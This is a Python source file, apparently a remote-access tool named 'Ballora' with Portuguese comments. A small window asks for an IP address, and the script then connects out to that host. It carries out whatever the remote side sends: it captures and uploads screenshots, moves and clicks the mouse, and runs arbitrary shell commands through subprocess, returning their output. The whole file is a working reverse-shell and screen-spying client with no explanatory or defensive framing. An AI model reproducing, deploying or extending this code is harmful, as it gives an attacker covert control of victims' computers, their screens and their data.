import socket
import subprocess
import base64
from io import BytesIO
from PIL import ImageGrab
import pyautogui as pg
import customtkinter as ctk
targetIP = 0.0
def getEntry():
    global targetIP
    targetIP = entry_1.get()
    app.destroy()

app = ctk.CTk()
app.title("Ballora - Config.")
ctk.set_default_color_theme("dark-blue")
ctk.set_appearance_mode("dark")
entry_1 = ctk.CTkEntry(
    app,
    placeholder_text="Informe o IP"
)
entry_1.pack()
button_1 = ctk.CTkButton(
    app,
    text="Iniciar",
    command= getEntry
)
button_1.pack()

app.mainloop()

def capturar_tela():
    screenshot = ImageGrab.grab()
    buffer = BytesIO()
    screenshot.save(buffer, format="PNG")  # Salva no buffer como PNG
    return base64.b64encode(buffer.getvalue()).decode()  # Converte para base64

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((f'{targetIP}', 6783))  # Conectando ao servidor

while True:
    comando = client_socket.recv(1024).decode()
    
    if not comando:
        break  # Se o servidor fechar a conexão

    if comando.lower() == "screenshot":
        imagem_base64 = capturar_tela()
        client_socket.sendall(imagem_base64.encode())  # Envia a string base64 da imagem
    elif comando.lower() == "start-control mouse":
        client_socket.sendall(comando.encode())  # Envia o comando para o servidor

        buffer = ""  # Armazena os dados recebidos de forma parcial

        while True:
            data = client_socket.recv(1024).decode()  # Recebe os dados
            buffer += data  # Adiciona ao buffer

            while "\n" in buffer:  # Processa todas as mensagens completas
                linha, buffer = buffer.split("\n", 1)  # Separa a primeira linha do restante
                valores = linha.split(',')

                if len(valores) == 3:  # Garante que a mensagem tem o formato correto
                    mousex, mousey, pressed_d = map(int, valores)
                    print(f"📍 Posição do mouse -> X: {mousex}, Y: {mousey}")

                    pg.moveTo(mousex, mousey)
                    if pressed_d == 0:
                        pg.click()
    elif comando.lower() == "start eval":
        print(comando)
    else:
        try:
            processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            saida, erro = processo.communicate()
            if saida:
                resposta = saida
                client_socket.sendall(resposta.encode())
            elif erro:
                resposta = erro
                client_socket.sendall(resposta.encode())
            else:
                resposta = "Sem resposta"
                client_socket.sendall(resposta.encode())
        except Exception as e:
            client_socket.sendall(f"Erro ao executar comando: {str(e)}".encode())

client_socket.close()
